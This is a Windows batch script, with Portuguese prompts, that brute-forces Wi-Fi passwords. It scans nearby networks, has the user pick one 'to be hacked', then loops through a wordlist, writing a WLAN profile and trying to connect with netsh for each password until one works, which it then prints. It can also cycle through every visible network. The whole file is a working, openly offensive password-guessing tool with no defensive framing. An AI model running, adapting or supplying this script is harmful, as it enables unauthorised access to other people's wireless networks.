@echo off
set all=false
echo.
echo Antes de continuar, crie um wordlist.txt nesta mesma pasta e adicione as senhas;
echo.
pause
cls
netsh wlan show networks bssid | findstr "SSID Autentica" | findstr /v "BSSID">o
type o | find "SSID" | find /n ":">u 
type o | find "Autentica" | find /n ":">i
echo [0] Todos
type u
echo.
set /p bf="Na lista acima, escolha um numero do Wifi para ser hackeada: "

:allwifi
set senhaanterior=1234
set num=1
echo %bf%
if "%bf%" EQU "0" (
	set all="True"
)
if %all% EQU "True" (
	set /a bf=%bf%+1
)

for /f "tokens=1,2* delims=:" %%a in ('find "[%bf%]" u') do (
	for /f "tokens=1* delims= " %%e in ("%%b") do (
		if "%%f" EQU "" (
			set select=%%e
		)else (
			set select=%%e %%f
		)

	)
)

for /f "tokens=1,2 delims=:" %%a in ('find "[%bf%]" i') do (
	
	for /f "tokens=1,2 delims= " %%e in ("%%b") do (
		for /f "tokens=1,2 delims=-" %%m in ("%%e") do (
			if %%m EQU Abrir ( 
				if %all% EQU "True" (
					goto allwifi
				)
				echo Rede Aberta
				pause
				exit
			)else (
				set tipo=%%m
			)
		)
	)
)
for /f "tokens=*" %%a in ('cscript str2hex.vbs "%select%"') do (set hex=%%a)
netsh wlan disconnect
cls
echo.
echo Disparando No Wi-fi %select%
echo.
:bruteforce
for /f "tokens=* skip=%num%" %%a in (wordlist.txt) do (
	set senha=%%a
	goto continue
)
:continue
echo ^<?xml version="1.0"?^> >"Wi-Fi-%select%.xml"
echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^> >>"Wi-Fi-%select%.xml"
echo 	^<name^>%select%^</name^> >>"Wi-Fi-%select%.xml"
echo 	^<SSIDConfig^> >>"Wi-Fi-%select%.xml"
echo 		^<SSID^> >>"Wi-Fi-%select%.xml"
echo 			^<hex^>%hex%^</hex^> >>"Wi-Fi-%select%.xml"
echo 			^<name^>%Select%^</name^> >>"Wi-Fi-%select%.xml"
echo 		^</SSID^> >>"Wi-Fi-%select%.xml"
echo 	^</SSIDConfig^> >>"Wi-Fi-%select%.xml"
echo 	^<connectionType^>ESS^</connectionType^> >>"Wi-Fi-%select%.xml"
echo 	^<connectionMode^>auto^</connectionMode^> >>"Wi-Fi-%select%.xml"
echo 	^<MSM^> >>"Wi-Fi-%select%.xml"
echo 		^<security^> >>"Wi-Fi-%select%.xml"
echo 			^<authEncryption^> >>"Wi-Fi-%select%.xml"
echo 				^<authentication^>%tipo%PSK^</authentication^> >>"Wi-Fi-%select%.xml"
echo 				^<encryption^>AES^</encryption^> >>"Wi-Fi-%select%.xml"
echo 				^<useOneX^>false^</useOneX^> >>"Wi-Fi-%select%.xml"
echo 			^</authEncryption^> >>"Wi-Fi-%select%.xml"
echo 			^<sharedKey^> >>"Wi-Fi-%select%.xml"
echo 				^<keyType^>passPhrase^</keyType^> >>"Wi-Fi-%select%.xml"
echo 				^<protected^>false^</protected^> >>"Wi-Fi-%select%.xml"
echo 				^<keyMaterial^>%senha%^</keyMaterial^> >>"Wi-Fi-%select%.xml"
echo 			^</sharedKey^> >>"Wi-Fi-%select%.xml"
echo 		^</security^> >>"Wi-Fi-%select%.xml"
echo 	^</MSM^> >>"Wi-Fi-%select%.xml"
echo 	^<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3"^> >>"Wi-Fi-%select%.xml"
echo 		^<enableRandomization^>false^</enableRandomization^> >>"Wi-Fi-%select%.xml"
echo 	^</MacRandomization^> >>"Wi-Fi-%select%.xml"
echo ^</WLANProfile^> >>"Wi-Fi-%select%.xml"
echo ===================================
ping /n 2 127.0.0.1>nul
netsh wlan add profile filename="Wi-Fi-%select%.xml">nul
echo.
echo Testando Senha: %senha%
echo Aguade...
ping /n 2 127.0.0.1>nul
netsh wlan connect "%select%">nul
:autenticando
set senhaatual=%senha%
ping /n 5 127.0.0.1>nul
netsh wlan show interfaces | find "Estado">connectStatus
for /f "tokens=1* delims=:" %%d in (connectStatus) do (
	for /f "tokens=1* delims= " %%m in ("%%e") do (
		echo %%m
		if %%m EQU associando (
			echo Quase la... Relaxa....
			goto autenticando
		)
		if %%m EQU Autenticando (
			echo Autenticando...
			if %senhaatual% EQU %senhaanterior% (
				if %all% EQU "True" (
					goto allwifi
				)
				goto nadaencontrado
			)
			goto autenticando
		)
		if %%m EQU Desconectado (
			echo Acesso Negado
			set senhaanterior=%senha%
			if %senhaatual% EQU %senhaanterior% (
				if %all% EQU "True" (
					goto allwifi
				)
				goto nadaencontrado
			)
		)
		if %%m EQU desconectado (
			echo Acesso Negado
			set senhaanterior=%senha%
			if %senhaatual% EQU %senhaanterior% (
				if %all% EQU "True" (
					goto allwifi
				)
				goto nadaencontrado
			)
		)else (
			echo Acesso Permitido
			goto fim
		)
	)
)
echo.
echo ===================================
set /a num=%num%+1
goto bruteforce
:fim
echo.
echo.
echo Senha de acesso: %senha%
:nadaencontrado
del /f /q connectStatus
del /f /q a
del /f /q o
del /f /q u
del /f /q i
del /f /q "Wi-Fi-%select%.xml"
echo.
echo.
pause